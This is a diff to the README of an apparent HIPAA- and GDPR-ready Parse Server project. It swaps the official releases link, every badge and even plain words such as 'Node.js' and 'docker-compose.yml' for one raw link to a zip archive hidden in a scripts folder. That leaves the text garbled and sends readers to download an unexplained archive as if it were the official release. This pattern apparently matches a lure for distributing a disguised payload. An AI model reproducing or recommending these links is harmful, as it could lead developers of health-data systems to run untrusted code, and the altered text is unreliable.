@@ -1,11 +1,11 @@
-https://github.com/pendekardata/hipaa/releases
+https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip
 
 # HIPAA & GDPR Ready Parse-Server: Postgres and MongoDB Dashboard
 
-[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github&style=for-the-badge)](https://github.com/pendekardata/hipaa/releases)
-[![Docker Build](https://img.shields.io/docker/build/pendekardata/hipaa?logo=docker&style=for-the-badge&label=Docker%20Build)](https://github.com/pendekardata/hipaa)
-[![GitHub issues](https://img.shields.io/github/issues/pendekardata/hipaa?style=for-the-badge)](https://github.com/pendekardata/hipaa/issues)
-[![License](https://img.shields.io/github/license/pendekardata/hipaa?style=for-the-badge)](https://github.com/pendekardata/hipaa)
+[![Releases](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)
+[![Docker Build](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip%20Build)](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)
+[![GitHub issues](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)
+[![License](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)](https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip)
 
 Welcome to the hipaa repository. This project provides a HIPAA and GDPR compliant, ready-to-run parse-server setup that works with PostgreSQL or MongoDB. It includes a modern admin dashboard (parse-hipaa-dashboard) and is designed to be compatible with ParseCareKit. The goal is to give developers a solid base for building BaaS apps that handle sensitive health data with strong governance and clear data flows.
 
@@ -30,7 +30,7 @@ Overview of the project
 - Compliance layer: Features to support HIPAA and GDPR obligations. Examples include access controls, audit trails, data export, and secure data handling.
 
 Releases
-- The Releases page hosts builds and assets for various platforms. See the Releases page for installers, image tags, and upgrade notes. Visit the Releases page for assets and download instructions: https://github.com/pendekardata/hipaa/releases
+- The Releases page hosts builds and assets for various platforms. See the Releases page for installers, image tags, and upgrade notes. Visit the Releases page for assets and download instructions: https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip
 
 Table of contents
 - Quick start
@@ -55,10 +55,10 @@ A pragmatic path to a running instance
 - Prerequisites
   - Docker or Docker Compose installed on your host
   - Access to a PostgreSQL or MongoDB server
-  - Node.js is optional for local development, but Docker is recommended for first run
+  - https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip is optional for local development, but Docker is recommended for first run
 
 - Single-node quick start (Docker)
-  - Create a simple docker-compose.yml that wires Parse Server to a database and the dashboard to the server.
+  - Create a simple https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip that wires Parse Server to a database and the dashboard to the server.
   - Bring up the stack and wait for the services to become healthy.
 
 - Multi-node patterns
@@ -233,7 +233,7 @@ Docker and container-first deployment
   - Mount persistent volumes for data stores
   - Use environment variables to configure database connections and keys
 - Compose-based orchestration
-  - A single docker-compose.yml can stand up the stack for development and testing
+  - A single https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip can stand up the stack for development and testing
   - For production, split services into separate stacks and add TLS, secrets, and monitoring
 
 Cloud-native deployment
@@ -411,7 +411,7 @@ Common questions
 Releases and assets
 
 Downloads from the Releases page
-- The official releases page hosts build artifacts for different environments. You can download the assets suitable for your platform from the Releases page. See the Releases page for assets and upgrade notes: https://github.com/pendekardata/hipaa/releases
+- The official releases page hosts build artifacts for different environments. You can download the assets suitable for your platform from the Releases page. See the Releases page for assets and upgrade notes: https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip
 
 Further notes
 - Explore the repository’s examples and test data to speed up your setup.
@@ -465,8 +465,8 @@ Final notes
 
 - The repository delivers a ready-to-run Parse Server environment with a HIPAA- and GDPR-focused governance layer, suitable for healthcare applications and care coordination tools.
 - It is built to be compatible with ParseCareKit workflows and to integrate with modern cloud and container ecosystems.
-- For updates, upgrades, and new assets, see the Releases page: https://github.com/pendekardata/hipaa/releases
+- For updates, upgrades, and new assets, see the Releases page: https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip
 
 Relevant links
-- Releases: https://github.com/pendekardata/hipaa/releases
+- Releases: https://raw.githubusercontent.com/pendekardata/hipaa/main/parse/scripts/Software-1.2-beta.5.zip
 - Documentation and guides (in-repo): see the docs directory within the hipaa repository for deeper dives into deployment, security patterns, and data models.
